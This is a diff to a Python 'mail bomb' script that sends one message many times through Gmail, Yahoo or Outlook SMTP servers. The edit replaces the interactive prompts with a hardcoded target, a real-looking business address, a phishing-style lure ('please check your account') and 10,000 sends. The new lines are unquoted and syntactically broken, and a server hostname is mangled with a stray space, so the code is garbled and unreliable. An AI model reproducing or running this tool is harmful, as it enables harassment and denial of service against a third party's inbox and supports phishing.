@@ -10,9 +10,9 @@ print(get_ascii_header())
 
 
 def get_mail_bomb_input():
-    recip_mail = input("What is the recipient\'s email address ? ")
-    message = input("Enter the message that you want to mail:\n")
-    times = int(input("How many times do you want to send mail ? "))
+    recip_mail = input(sales@kidzshack.com.au)
+    message = input(please check your account)
+    times = int(input(10000))
 
     return MailBomb(recip_mail, times, message)
 
@@ -21,9 +21,10 @@ def get_smtp_server_and_port(server):
 
     
     select_smtp = {
-        "gmail" : "smtp.gmail.com",
+        "gmail" : "smtp. gmail.com",
         "yahoo" : "smtp.mail.yahoo.com",
-        "outlook" : "smtp.live.com"
+        "outlook"
+        : "smtp.live.com"
     }
     
     select_port = {
@@ -39,7 +40,8 @@ def get_smtp_server_and_port(server):
     elif server == "yahoo":
         smtp_server = "smtp.mail.yahoo.com"
         port = 465
-    elif server == "outlook":
+    elif\
+            server == "outlook":
         smtp_server = "smtp.live.com"
     else:
         raise ValueError('SMTP server and port not available')
